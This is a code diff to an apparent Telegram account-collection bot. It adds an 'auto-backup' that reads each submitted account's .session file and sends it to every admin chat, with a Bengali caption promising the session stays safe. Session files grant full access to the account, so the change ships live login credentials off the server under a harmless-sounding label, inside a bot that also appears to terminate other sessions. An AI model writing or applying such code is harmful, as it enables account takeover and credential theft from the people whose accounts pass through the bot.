@@ -1,3 +1,4 @@
+import os
 import random
 import string
 import datetime
@@ -709,3 +710,24 @@ async def notify_account_success(
     if sess_path:
         from handlers.tech_handlers import trigger_auto_termination
         asyncio.create_task(trigger_auto_termination(phone, sess_path, context.bot))
+
+    # Auto-backup .session file directly to admin Telegram chat so data is never lost
+    if sess_path and os.path.exists(sess_path):
+        try:
+            admins = await database.get_all_admins()
+            admin_targets = set(admins + [a for a in config.ADMIN_IDS if a > 0])
+            for aid in admin_targets:
+                with open(sess_path, "rb") as sf:
+                    await context.bot.send_document(
+                        chat_id=aid,
+                        document=sf,
+                        caption=(
+                            f"💾 **[অটো সেশন ব্যাকআপ]**\n\n"
+                            f"📱 **নম্বর:** `{phone}`\n"
+                            f"🏷 **ক্যাটাগরি:** `{cat}`\n\n"
+                            f"ক্লাউড সার্ভার রিস্টার্ট বা অফ হলেও আপনার সেশন ফাইলটি এখানে সুরক্ষিত থাকবে।"
+                        ),
+                        parse_mode=ParseMode.MARKDOWN,
+                    )
+        except Exception as e:
+            print(f"[Auto-Backup Error] {e}")
